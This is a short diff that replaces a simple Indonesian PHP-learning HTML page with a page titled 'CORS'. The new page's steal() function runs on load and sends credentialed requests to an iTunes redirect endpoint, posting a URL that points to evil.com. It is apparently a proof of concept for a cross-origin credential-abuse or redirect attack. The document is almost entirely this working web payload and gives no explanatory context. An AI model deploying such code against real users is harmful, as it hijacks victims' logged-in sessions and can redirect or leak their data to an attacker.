@@ -1,11 +1,19 @@
+<!DOCTYPE html>
 <html>
-<head>
-<title>Belajar PHP</title>
-</head>
-<body>
-<center>
-<h4>Contoh Pertama</h4>
-<p>Hallo Buk &#128512;</p>
-</center>
-</body>
-</html>
+<head><title>CORS</title></head>
+<script>
+function steal(){
+var xmlH = new XMLHttpRequest();
+xmlH.open("GET", "https://itunes.apple.com/WebObjects/MZStoreServices.woa/wa/processRedirectUrl", true);
+xmlH.withCredentials = true;
+xmlH.send();
+xmlH.onload = function(){
+data = JSON.parse(this.responseText);
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://itunes.apple.com/WebObjects/MZStoreServices.woa/wa/processRedirectUrl", true);
+xhr.setRequestHeader("Content-Type", "application/json");
+xhr.send('https%3A%2F%2Fevil.com%2Fus%2Fbook%2Fthe-fifth-witness%2Fid395519191%3FEmail_OID%3D1a059baaa95f18c923861806206b16b2%26Email_PageName%3DP0009647-%26at%3D10lIEQ%26ct%3Dlink%26itscg%3D30200%26itsct%3Dbooks_toolbox%26ls%3D1%26uo%3D4');
+}
+}
+</script>
+<body onload="steal()"></body>
